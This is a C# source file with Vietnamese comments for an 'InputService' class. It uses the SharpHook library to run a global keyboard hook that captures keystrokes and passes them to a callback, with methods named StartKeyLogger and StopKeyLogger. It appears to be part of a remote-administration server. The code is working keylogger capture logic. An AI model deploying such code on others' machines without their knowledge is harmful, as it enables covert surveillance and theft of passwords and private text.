using System;
using System.Threading.Tasks;
using SharpHook;
using SharpHook.Native;
using System.Runtime.InteropServices; // Thư viện này để lấy thông tin OS
using System.Threading;

namespace Server.Services
{
    public class InputService : IDisposable
    {
        private TaskPoolGlobalHook _hook;
        private bool _isRunning = false;
        private Action<string>? _onKeyDataReceived;

        public InputService()
        {
            _hook = new TaskPoolGlobalHook();
            _hook.KeyPressed += OnKeyPressed;
        }

        public void StartKeyLogger(Action<string> callback)
        {
            if (_isRunning) return;
            
            // [SỬA] Cần re-initialize hook nếu nó đã bị Dispose trước đó để cho phép Restart
            // Logic này đảm bảo việc bấm Start/Stop nhiều lần hoạt động
            if (_hook == null || !_hook.IsRunning)
            {
                 _hook = new TaskPoolGlobalHook();
                 _hook.KeyPressed += OnKeyPressed;
            }

            _onKeyDataReceived = callback;
            _isRunning = true;

            Task.Run(() => 
            {
                try
                {
                    Console.WriteLine($"Keylogger starting on {RuntimeInformation.OSDescription}.");
                    
                    // [NOTE MACOS] Thêm cảnh báo quyền
                    if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                    {
                         Console.WriteLine("--- MACOS WARNING ---: Keylogging requires explicit 'Accessibility' permission. Please check system settings.");
                    }
                    
                    _hook.Run(); // Lệnh này là blocking call
                    Console.WriteLine("Keylogger stopped naturally.");
                }
                catch (Exception ex)
                {
                    // Ngoại lệ này thường xảy ra khi Dispose được gọi
                    if (!_hook.IsRunning)
                    {
                         Console.WriteLine("Keylogger stopped via Dispose.");
                    }
                    else
                    {
                        Console.WriteLine($"Keylogger error: {ex.Message}");
                    }
                }
                // Thiết lập lại cờ sau khi task hoàn thành
                _isRunning = false;
            });
        }
        
        public void StopKeyLogger()
        {
            if (!_isRunning) return;
            
            // [SỬA] Đảm bảo gọi Dispose() để thoát khỏi vòng lặp hook.Run()
            if (_hook.IsRunning)
            {
                _onKeyDataReceived = null;
                Console.WriteLine("Keylogger stopping...");
                
                // Dispose là cách duy nhất để dừng hook đang chạy
                _hook.Dispose(); 
            }
        }

        private void OnKeyPressed(object sender, KeyboardHookEventArgs e)
        {
            if (!_isRunning || _onKeyDataReceived == null) return;

            var keyData = FormatKey(e.Data);

            // [SỬA] Chỉ gọi Invoke nếu phím tạo ra ký tự (e.g., ignore Shift, Ctrl, Alt)
            if (!string.IsNullOrEmpty(keyData))
            {
                 _onKeyDataReceived.Invoke(keyData);
            }
        }

        // [FIX LỖI ASCII/CASE] Sử dụng data.KeyChar để ưu tiên ký tự đã được xử lý
        private string FormatKey(KeyboardEventData data)
        {
            // 1. Nếu có ký tự Unicode/ASCII được tạo ra (Chữ, số, ký hiệu)
            if (data.KeyChar != 0)
            {
                switch (data.KeyChar)
                {
                    case '\r': // Enter
                    case '\n': return "{ENTER}";
                    case '\t': return "{TAB}";
                    case ' ': return " ";
                    default:
                         // Trả về ký tự đã được xử lý (Đúng case: a/A, 1/!)
                        return data.KeyChar.ToString(); 
                }
            }

            // 2. Phím đặc biệt (Modifiers, Functions, Arrows)
            switch (data.KeyCode)
            {
                case KeyCode.VcBackspace: return "{BACKSPACE}";
                case KeyCode.VcDelete: return "{DELETE}";
                case KeyCode.VcEscape: return "{ESC}";
                case KeyCode.VcCapsLock: return "{CAPSLOCK}";

                // [FIX] Các phím modifiers KHÔNG NÊN sinh ra log (trả về rỗng)
                case KeyCode.VcLeftShift:
                case KeyCode.VcRightShift:
                case KeyCode.VcLeftControl:
                case KeyCode.VcRightControl:
                case KeyCode.VcLeftAlt:
                case KeyCode.VcRightAlt:
                case KeyCode.VcLeftMeta:
                case KeyCode.VcRightMeta:
                    return ""; 
                    
                case KeyCode.VcEnter: return "{ENTER}"; // Fallback cho ENTER nếu KeyChar = 0
                case KeyCode.VcSpace: return " "; 
                case KeyCode.VcTab: return "{TAB}";
                
                case KeyCode.VcPageUp: return "{PAGEUP}";
                case KeyCode.VcPageDown: return "{PAGEDOWN}";
                case KeyCode.VcEnd: return "{END}";
                case KeyCode.VcHome: return "{HOME}";
                case KeyCode.VcLeft: return "{LEFT}";
                case KeyCode.VcUp: return "{UP}";
                case KeyCode.VcRight: return "{RIGHT}";
                case KeyCode.VcDown: return "{DOWN}";
                
                default:
                    // Trả về mã phím nếu không có ký tự và không phải phím đặc biệt
                    return $"[{data.KeyCode}]";
            }
        }

        public void Dispose()
        {
            // [NOTE] Dừng hook khi service bị Dispose
            StopKeyLogger();
            // Clean up the hook object instance
            _hook?.Dispose(); 
        }
    }
}